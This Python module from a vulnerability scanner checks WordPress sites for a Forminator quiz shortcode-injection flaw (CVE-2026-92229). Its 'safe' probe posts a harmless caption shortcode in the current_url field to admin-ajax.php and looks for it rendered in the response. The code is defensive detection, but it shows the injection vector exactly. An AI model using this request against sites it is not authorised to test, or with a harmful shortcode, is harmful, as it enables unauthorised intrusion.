from __future__ import annotations

import urllib.parse
from typing import Any

from ...core.http import normalize_url, request
from ...core.models import Finding
from .forminator_advisory import COMPONENT, discover_forms, passive_result

CVE_ID = "CVE-2026-92229"
NAME = "Forminator unauthenticated arbitrary shortcode execution"
AFFECTED_RULE = "Forminator <=1.57.2; fixed in 1.57.3"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe"]


def classify_version(version: str | None) -> str:
    from .forminator_advisory import classify_version as classify

    return classify(version, fixed="1.57.3")


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    forms = [form for form in discover_forms(target_url, timeout, proxy) if form["has_quiz"] and form["form_ids"]]
    if not forms:
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, detail="No public Forminator quiz with a discoverable form ID was found; the vulnerable renderer could not be tested safely.", action="Upgrade Forminator to 1.57.3 or newer and manually review any non-public quiz pages.")
    form = forms[0]
    marker = "PROOFCMS-CVE-92229"
    shortcode = f"[caption]{marker}[/caption]"
    data = {"action": "forminator_submit_form_quizzes", "form_id": form["form_ids"][0], "current_url": shortcode}
    if form.get("nonce"):
        data["_wpnonce"] = form["nonce"]
    response = request(f"{normalize_url(target_url)}/wp-admin/admin-ajax.php", method="POST", data=urllib.parse.urlencode(data).encode(), headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": form["page_url"]}, timeout=timeout, proxy=proxy)
    body = str(response.get("body", ""))
    if marker in body and "wp-caption" in body:
        return Finding(cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{normalize_url(target_url)}/wp-admin/admin-ajax.php", detail="A harmless caption shortcode was evaluated by the public quiz renderer. No code-execution or state-changing shortcode was sent.", action="Upgrade Forminator to 1.57.3 or newer immediately.")
    return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, detail=f"A public quiz was found, but the harmless shortcode proof was not reflected/evaluated (HTTP {response.get('status', 0)}).", action="Upgrade affected Forminator versions even when external proof is inconclusive.")


def check(target_url: str, cms_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    passive = passive_result(cve=CVE_ID, name=NAME, affected_rule=AFFECTED_RULE, plugins=plugins, fixed="1.57.3", remediation="Upgrade Forminator to 1.57.3 or newer.")
    if not run_exploit_check or exploit_mode != "safe" or passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "wordpress", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_versions": ["<=1.57.2"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "module_version": "1.0.0", "last_reviewed": "2026-10-12", "updated": "2026-10-12", "required_detectors": ["detect_wordpress_plugins"], "references": ["https://github.com/advisories/GHSA-2vrv-wr6r-v79v", "https://github.com/murrez/CVE-2026-92229", "https://plugins.trac.wordpress.org/browser/forminator/tags/1.57.2/library/modules/quizzes/front/front-action.php"]}
